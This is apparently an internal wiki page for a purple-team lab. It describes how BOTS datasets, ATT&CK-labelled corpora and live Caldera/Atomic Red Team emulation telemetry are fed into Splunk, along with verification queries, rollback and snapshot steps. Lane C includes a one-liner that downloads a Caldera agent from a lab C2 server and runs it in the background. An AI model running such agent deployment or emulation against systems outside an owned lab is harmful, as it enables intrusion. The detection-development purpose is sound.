# Corpus Injection — getting hunt-ready telemetry into lab Splunk

<!-- WIKI:GENERATED unit=unit-corpus-injection-corpus-injection-getting-hunt-ready-telemetry-into-lab-splunk -->
Blue and purple need adversary telemetry to hunt. Waiting for red bench runs to
produce it is the bottleneck. This document covers the three lanes that fill the
lab SIEM, what each is good for, and how to verify or reverse each one.

| Lane | Source | Lands in | Labeled? | Reversible |
|---|---|---|---|---|
| **A — BOTS** | Splunk Boss of the SOC v1/v2/v3 | `botsv1` / `botsv2` / `botsv3` | Yes (published answer keys) | Remove app dir + restart |
| **B — ATT&CK corpora** | splunk/attack_data, OTRF Security-Datasets, two EVTX sets | `portal5_lab`, `evidence_origin=corpus:*` | Yes (technique-tagged) | Tagged `\| delete` |
| **C — Live emulation** | Caldera + Atomic Red Team against owned lab targets | `portal5_lab`, `evidence_origin=live:caldera:*` | **No** — novel/unlabeled | Tagged `\| delete` |

Lanes A and B are finite and pre-labeled: every event already carries its answer,
which makes them ideal for detection coverage and hunt training but useless for
discovery work. Lane C is the only lane that generates genuinely novel, unlabeled
activity, which is what `ANOMALOUS_UNCLASSIFIED` / discovery evaluation needs.
<!-- /WIKI:GENERATED -->

---

## Combined corpus validation gate

<!-- WIKI:GENERATED unit=unit-security-combined-corpus-validation -->
Live Portal captures and outside corpora are one detection-development input,
but they prove different things. A schema-v2, episode-scoped Portal capture
with scenario-specific validity and a real PCAP proves an end-to-end lab
scenario. BOTS/ATT&CK-labeled corpus data broadens technique coverage; it must
never be counted as proof that the corresponding Portal attack scenario ran.

`config/security_corpus.yaml` is the source contract. It keeps theory outside
capture modes, makes answer keys scorer-only, requires source-stratified
results, and forbids external scenario substitution. New live captures record
their data mode, evidence origin, and answer-key visibility. Replay rejects
hollow captures even when they contain telemetry, preventing a request without
execution proof from becoming blue/purple ground truth. Agentic-blue replay
uses an opaque model-visible scenario name so catalog labels such as an exploit
name cannot leak the scorer's answer into the investigation prompt. Capture
save, replay, and agentic load also resolve target metadata through the current
scenario catalog; a capture made before DHCP-driven target repair cannot send
blue back to the obsolete address.

Run the readiness gate against the current lab before validation:

```bash
python3 scripts/security_corpus_report.py --probe-external \
  --output /tmp/security_corpus_report.json
```

The report derives live scenario coverage, live/external/combined technique
coverage, provenance per technique, and uncovered techniques from the current
scenario catalog and lab state. A committed curated inventory alone cannot
pass: external data must be probed successfully after a reset. Blue/purple
result records carry `data_mode`, `evidence_origin`, and
`answer_key_visibility`, so metrics can be compared per source before any
combined summary is used for detection design.
<!-- /WIKI:GENERATED -->

---

## Why corpus data coexists safely with bench runs

<!-- WIKI:GENERATED unit=unit-corpus-injection-why-corpus-data-coexists-safely-with-bench-runs -->
Lane B writes into the same `portal5_lab` index the bench uses. Three properties
keep the two from contaminating each other — all three are asserted in
`scripts/corpus_ingest.py` and verifiable after any injection:

1. **Backdating.** Every event ships with its original timestamp via
   `ship_batch(..., event_time=...)`. Corpus events therefore land far outside
   `blue_triage.poll_alerts`' recent `earliest=-Nm` window and never appear as
   live alerts. Events with no recoverable timestamp are backdated by
   `--backdate-days` (default 30) rather than defaulting to ship time.
2. **No `episode_id`.** Episode-scoped bench scoring queries
   (`SplunkBackend.query_episode`) filter on the indexed `episode_id` field.
   Corpus events carry none, so they can never enter a bench episode's score.
   Lane C events *do* carry one (the Caldera operation id) — by design, so blue
   and purple can consume them exactly like bench telemetry.
3. **Provenance.** `evidence_origin` is `corpus:<src>:<label>` or
   `live:caldera:<profile>`, which makes every injected event attributable and
   the whole injection reversible in one search.
<!-- /WIKI:GENERATED -->

---

## Lane A — BOTS pre-indexed datasets

<!-- WIKI:GENERATED unit=unit-corpus-injection-lane-a-bots-pre-indexed-datasets -->
BOTS ships as pre-indexed Splunk buckets, so it does **not** go through HEC. Each
tarball untars into `$SPLUNK_HOME/etc/apps` and serves its own index.

```bash
<!-- /WIKI:GENERATED -->

---

# inside LXC 301, as the splunk user (uid 41812) — the apps dir is splunk-owned.

<!-- WIKI:GENERATED unit=unit-corpus-injection-inside-lxc-301-as-the-splunk-user-uid-41812-the-apps-dir-is-splunk-owned -->
docker cp scripts/lab_bots_install.py splunk:/tmp/
docker exec -u splunk splunk /opt/splunk/bin/python3 /tmp/lab_bots_install.py \
    --workdir /opt/splunk/var/p5corpus
```

The installer is idempotent (a dataset whose app dir exists is skipped) and
additive-only. Re-running it repairs retention on an already-installed dataset.

Operational notes learned installing this, worth keeping:

- **Sizing.** The three datasets are ~24 GB of download and roughly the same
  again extracted. The installer refuses to start a dataset it cannot fit and
  deletes each archive after a successful extract.
- **Retention is a time bomb.** Each dataset ships
  `frozenTimePeriodInSecs = 377395200` (~12y) measured from the *event*
  timestamps, and BOTS v1's events are from 2016. Left alone the buckets
  silently freeze and are deleted (no `coldToFrozenDir` is set). The installer
  writes a `local/indexes.conf` override raising the ceiling, without editing
  the shipped default.
- **Bucket compatibility.** BOTS was built on Splunk 6.5/7.x. The lab runs
  Splunk 10.2 and reads those buckets without conversion.
- **Registering a new index may need more than a restart.** Splunk only
  discovers a newly added app at startup, and a `splunk restart` will be
  *refused* while a KVStore upgrade is pending or failed. When that happens,
  register the index directly against the existing bucket paths instead:

  ```bash
  curl -ks -u "$LAB_SPLUNK_USER:$LAB_SPLUNK_PASSWORD" \
    -X POST "$LAB_SPLUNK_URL/services/data/indexes" \
    -d name=botsv2 \
    -d 'homePath=$SPLUNK_HOME/etc/apps/botsv2_data_set/var/lib/splunk/botsv2/db' \
    -d 'coldPath=$SPLUNK_HOME/etc/apps/botsv2_data_set/var/lib/splunk/botsv2/colddb' \
    -d 'thawedPath=$SPLUNK_HOME/etc/apps/botsv2_data_set/var/lib/splunk/botsv2/thaweddb'
  ```

Verify (counts are large; `tstats` avoids a full scan):

```bash
| tstats count where index=botsv1 OR index=botsv2 OR index=botsv3 by index
```

**Field extraction / Splunkbase add-ons.** BOTS ships raw events; the field
aliases and CIM normalization live in Splunkbase add-ons listed in each
dataset's README. Without them the data is still fully searchable, but
sourcetype-specific fields (Sysmon, Windows TA, Stream, Suricata) do not
extract, so the published BOTS hunt searches match nothing.

Splunkbase app *pages* are public but the **download endpoint returns 401** — it
needs a splunk.com account. `scripts/lab_splunkbase_install.py` handles the
whole flow; credentials come from the environment and are never written to disk:

`SPLUNKBASE_USERNAME` / `SPLUNKBASE_PASSWORD` live in `.env` (gitignored;
placeholders in `.env.example`), so sourcing it is all that is needed — there is
nothing to remember or paste:

```bash
set -a; . ./.env; set +a
docker cp scripts/lab_splunkbase_install.py splunk:/tmp/
docker exec -u splunk -e SPLUNKBASE_USERNAME -e SPLUNKBASE_PASSWORD \
    splunk /opt/splunk/bin/python3 /tmp/lab_splunkbase_install.py
```

These are **install-time only** — no runtime or serving path reads them, which
is why they are not part of the stack's env contract.

Its `BOTS_APP_IDS` is the union of every app id referenced across the v1/v2/v3
READMEs. It installs the **latest** release of each rather than the BOTS-era
version pinned in the README, because those are Splunk 6.5/7.1-era builds and
this lab runs Splunk 10.2. Two auth details that cost time:

- Basic auth against `api/account:login/` returns `Bad Request`; the endpoint
  wants the credentials as **POST form fields**, and returns the session token
  as `<id>` in an Atom feed. That token then goes in an `X-Auth-Token` header.
- App **2760** (TA-Suricata, named in the v1/v2 READMEs) is fully delisted —
  every version 404s. It is superseded by app **4242** ("TA for Suricata").

Add-ons load at splunkd startup, so restart afterwards. Extraction is
search-time, so add-ons installed *after* the data still apply retroactively —
there is no need to reinstall or re-index a dataset to pick up a new TA.
<!-- /WIKI:GENERATED -->

---

## Lane B — ATT&CK-labeled corpora over HEC

<!-- WIKI:GENERATED unit=unit-corpus-injection-lane-b-att-ck-labeled-corpora-over-hec -->
`scripts/corpus_ingest.py` reuses the existing `ship_batch` primitive — no new
HEC code — and maps events onto the four sourcetypes `spl_detections.yaml`
actually fires on, so the existing SPL library lights up with zero rule changes.

```bash
<!-- /WIKI:GENERATED -->

---

# Always dry-run first: it prints exact per-sourcetype volume without injecting.

<!-- WIKI:GENERATED unit=unit-corpus-injection-always-dry-run-first-it-prints-exact-per-sourcetype-volume-without-injecting -->
python3 scripts/corpus_ingest.py --src attack_data --root /path/attack_data/datasets --dry-run
python3 scripts/corpus_ingest.py --src attack_data --root /path/attack_data/datasets --ship
```

Corpora used, and what each needs:

- **`splunk/attack_data`** — highest fit; purpose-built for detection dev. Stores
  data in **git-lfs**, so a plain clone yields pointer files. Run
  `git lfs install --local && git lfs pull && git lfs checkout` — a `git lfs pull`
  alone will fetch the objects but leave the working tree as pointers if LFS
  filters were never installed for the repo. The loader detects and skips
  pointer files rather than shipping them, and reports the count.
- **`OTRF/Security-Datasets`** (Mordor) — JSON datasets inside per-dataset `.zip`.
- **`sbousseaden/EVTX-ATTACK-SAMPLES`** and **`mdecrevoisier/EVTX-to-MITRE-Attack`**
  — raw `.evtx`. The loader decodes these inline (`pip install evtx`); no manual
  EVTX→JSON pre-step is needed.
<!-- /WIKI:GENERATED -->

---

### Two format traps that silently produce useless data

<!-- WIKI:GENERATED unit=unit-corpus-injection-two-format-traps-that-silently-produce-useless-data -->
Both were hit building this lane. Neither fails loudly — they yield events that
index fine and match nothing.

1. **Multi-line records.** `attack_data`'s Windows logs are Splunk exports where
   one event spans many `key=value` lines under a `M/D/YYYY H:MM:SS AM` header.
   Iterating per line splits `EventCode=` away from the fields the SPL correlates
   with, inflating counts ~25× while making every detection match zero. The
   loader reassembles records on that header, deciding the format once per file.
2. **JSON envelopes.** EVTX/Mordor records put the event id at
   `Event.System.EventID`, but `spl_detections.yaml` filters on
   `EventCode=4769 TicketEncryptionType=0x17`. Shipping the JSON as-is indexes
   12k events with *zero* extractable `EventCode`. The loader renders Windows
   channels as flat `EventCode=... Field=value` text, mirroring
   `siem/collect.py::_normalize_windows_security_events`, so corpus events and
   live bench telemetry present identically to the detections. This is the same
   trap `siem/capture_store.py::replay_capture` documents.

Non-Windows JSON (`aws:cloudtrail`, `o365:...`) keeps its structure, which
Splunk's native JSON extraction already handles.

**PCAP is deliberately out of scope.** Mordor bundles `.pcap`/`.pcapng` beside
its host telemetry. Reading those as text yields millions of binary junk lines,
and there are no network detections in `spl_detections.yaml` to hunt them with
(only `web:access` is network-side). The loader filters archive members to text
formats. Ingesting flow data you cannot hunt is negative ROI until a
Zeek/Suricata lane exists.
<!-- /WIKI:GENERATED -->

---

### Verify Lane B

<!-- WIKI:GENERATED unit=unit-corpus-injection-verify-lane-b -->
```bash
<!-- /WIKI:GENERATED -->

---

# landing + which sourcetypes got data

<!-- WIKI:GENERATED unit=unit-corpus-injection-landing-which-sourcetypes-got-data -->
index=portal5_lab evidence_origin=corpus:* earliest=0 | stats count by sourcetype
<!-- /WIKI:GENERATED -->

---

# the property that matters: field extraction actually works

<!-- WIKI:GENERATED unit=unit-corpus-injection-the-property-that-matters-field-extraction-actually-works -->
index=portal5_lab evidence_origin=corpus:* earliest=0
  | stats count(EventCode) as with_eventcode, count as total
<!-- /WIKI:GENERATED -->

---

# a canned detection firing on corpus data (T1558.004 AS-REP roasting, verbatim SPL)

<!-- WIKI:GENERATED unit=unit-corpus-injection-a-canned-detection-firing-on-corpus-data-t1558-004-as-rep-roasting-verbatim-spl -->
index=portal5_lab sourcetype="windows:security" EventCode=4768 PreAuthType=0
  evidence_origin=corpus:* earliest=0 | stats count by Account
<!-- /WIKI:GENERATED -->

---

# confirm the live triage window is still clean

<!-- WIKI:GENERATED unit=unit-corpus-injection-confirm-the-live-triage-window-is-still-clean -->
index=portal5_lab earliest=-60m evidence_origin=corpus:* | stats count
```
<!-- /WIKI:GENERATED -->

---

### Rollback

<!-- WIKI:GENERATED unit=unit-corpus-injection-rollback -->
Because every event is tagged and backdated, removal is surgical and never
touches bench data:

```
index=portal5_lab evidence_origin=corpus:* | delete
```

`| delete` requires the `can_delete` role, which is **not** part of `admin` by
default. Grant it once:

```bash
curl -ks -u "$LAB_SPLUNK_USER:$LAB_SPLUNK_PASSWORD" \
  -X POST "$LAB_SPLUNK_URL/services/authorization/roles/admin" \
  -d imported_roles=power -d imported_roles=user -d imported_roles=can_delete
```

Confirm the scope before deleting — this splits the index into what would go and
what would stay:

```
index=portal5_lab earliest=0
  | eval grp=if(like(evidence_origin,"corpus:%"),"CORPUS","BENCH") | stats count by grp
```
<!-- /WIKI:GENERATED -->

---

## Lane C — live emulation (Caldera + Atomic Red Team)

<!-- WIKI:GENERATED unit=unit-corpus-injection-lane-c-live-emulation-caldera-atomic-red-team -->
Caldera runs on lab-internal LXC 302 (`portal-lab-caldera`, 10.10.11.60:8888) as
a systemd unit, on the VLAN-60 lab bridge only. The Atomic Red Team ability
collection is included via Caldera's bundled `atomic` plugin.

`scripts/caldera_emulate.py` runs an adversary profile and then flows the
resulting telemetry through the **same** `collect_target → ship_batch →
wait_indexed` path the bench uses, stamped with the Caldera operation id as
`episode_id`:

```bash
python3 scripts/caldera_emulate.py --list
python3 scripts/caldera_emulate.py --adversary "Portal5 Linux Discovery" --group red
```

The driver refuses to target any host outside `LAB_TARGET_NETWORK`.

Deploying an agent onto a lab target:

```bash
<!-- /WIKI:GENERATED -->

---

# on the target, from the lab network

<!-- WIKI:GENERATED unit=unit-corpus-injection-on-the-target-from-the-lab-network -->
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" \
     http://10.10.11.60:8888/file/download -o /tmp/p5agent
chmod +x /tmp/p5agent && setsid /tmp/p5agent -server http://10.10.11.60:8888 -group red &
```

Setup notes: Caldera compiles the sandcat agent on demand, so the **Go toolchain
must be installed on the Caldera host** — without it the download returns a
55-byte error string instead of a binary. The Magma web UI needs **Node 20.19+**;
Debian 12's Node 18 fails the Vite build.

Build profiles from ATT&CK technique IDs rather than picking stock adversaries,
so the emulation targets techniques the detection library covers:

```bash
curl -s -H "KEY: $CALDERA_API_KEY" -H "Content-Type: application/json" \
  -X POST http://10.10.11.60:8888/api/v2/adversaries \
  -d '{"name":"Portal5 Linux Discovery","atomic_ordering":["<ability-id>", "..."]}'
```
<!-- /WIKI:GENERATED -->

---

### Verify Lane C

<!-- WIKI:GENERATED unit=unit-corpus-injection-verify-lane-c -->
```
index=portal5_lab evidence_origin=live:caldera:* earliest=0
  | stats count by sourcetype, host, episode_id
```

and the same events must come back from
`SplunkBackend.query_episode(<operation_id>)`.
<!-- /WIKI:GENERATED -->

---

## Durability — surviving a lab reset

<!-- WIKI:GENERATED unit=unit-corpus-injection-durability-surviving-a-lab-reset -->
Everything these three lanes produce lives **only in the lab**, not in git. The
scripts are versioned; the ~275M indexed events are not. A rollback of the
Splunk container to an older snapshot silently erases all of it, and the
bench's own reset paths roll lab guests back to named snapshots routinely
(`LAB_CLEAN_SNAPSHOT`, `LAB_MBPTL_SNAPSHOT`).

Restore points covering this work, on `proxmox3`:

| Guest | Snapshot | Covers |
|---|---|---|
| LXC 301 `portal-lab-splunk` | `corpus-loaded` | BOTS v1/v2/v3, the `portal5_lab` corpus, all Splunkbase add-ons, the `can_delete` grant, the grown rootfs |
| LXC 302 `portal-lab-caldera` | `caldera-ready` | Caldera + Go + Node 22 + magma build, systemd unit, adversary profile |

```bash
pct listsnapshot 301                 # confirm the restore point still exists
pct snapshot 301 <name> -description # take a new one after materially adding data
```

Take the Splunk snapshot with the `splunk` container **stopped** (`docker stop
splunk`, then snapshot, then `docker start`) so bucket files are consistent
rather than crash-state.

What is *not* covered, and why it does not matter much:

- The **sandcat agent** on a target lives in `/tmp` and does not survive a
  reboot or a target rollback. Redeploy it with the one-liner in Lane C; it is
  a single curl.
- Nothing else is stateful. If both containers were lost entirely, the three
  scripts rebuild the whole thing unattended — that is the point of keeping the
  installers idempotent rather than hand-installing.

Rebuild cost if a restore point is lost: ~25 GB of BOTS download plus a
multi-hour HEC re-ship for Lane B. The snapshots are cheap copy-on-write; the
rebuild is not.
<!-- /WIKI:GENERATED -->

---

## Related

<!-- WIKI:GENERATED unit=unit-corpus-injection-related -->
- `scripts/lab_bots_install.py` — Lane A installer
- `scripts/lab_splunkbase_install.py` — Lane A field-extraction add-ons
- `scripts/corpus_ingest.py` — Lane B loader
- `scripts/caldera_emulate.py` — Lane C driver
- `portal/modules/security/core/siem/hec_ship.py` — the shared `ship_batch` primitive
- `portal/modules/security/core/siem/spl_detections.yaml` — the detections these lanes feed
- `docs/LAB_SETUP.md` — lab topology and target inventory
<!-- /WIKI:GENERATED -->

---
